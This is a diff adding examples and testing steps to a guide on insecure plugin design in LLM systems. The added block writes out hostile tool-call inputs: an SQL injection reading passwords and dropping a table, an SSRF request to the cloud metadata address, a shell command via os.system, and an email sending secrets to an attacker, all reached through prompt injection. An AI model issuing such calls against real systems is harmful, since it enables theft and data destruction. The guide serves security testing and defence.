@@ -14,6 +14,34 @@ The consequences of Insecure Plugin Design can be wide-ranging and severe:
 - Data Breaches: Attackers exploiting vulnerabilities in plugins can gain unauthorized access to sensitive information stored within the LLM system.
 - Model Manipulation: Malicious actors could manipulate the LLM's outputs through compromised plugins, potentially leading to the generation of misleading or harmful content.
 - Denial-of-Service (DoS) Attacks: Vulnerable plugins can be weaponized to launch DoS attacks, overwhelming the LLM system and rendering it unavailable for legitimate users.
+## Concrete examples
+
+Plugins/tools let the LLM take actions (query a DB, call an API, run code). The danger: the LLM passes attacker-influenced free-text straight into a plugin that doesn't validate it.
+
+```text
+# 1. A "database" plugin that takes raw SQL from the model
+Prompt: "Look up my orders" -> model calls db_plugin("SELECT * FROM orders")
+Attack via prompt injection: make the model call
+  db_plugin("SELECT password FROM users; DROP TABLE logs;--")
+
+# 2. A "web request" plugin with no allowlist -> SSRF
+Make the model call fetch("http://169.254.169.254/latest/meta-data/")
+
+# 3. A code-exec / shell plugin
+Make the model call run_code("import os; os.system('id')")
+
+# 4. Over-privileged email plugin
+Make the model call send_email(to=attacker, body=<all context/secrets>)
+```
+
+Because plugins accept parameterized text, a successful prompt injection chains directly into these actions - this is how prompt injection turns into real impact.
+
+## How to test
+
+1. Enumerate what tools/plugins the assistant can call and their parameters.
+2. Use prompt injection to invoke a plugin with attacker-chosen arguments.
+3. Check whether plugin inputs are validated and whether the plugin runs with least privilege.
+
 ## Building a Fortified Bridge: Mitigating Insecure Plugin Design
 
 Combating Insecure Plugin Design requires a multi-layered approach, focusing on both prevention and mitigation:
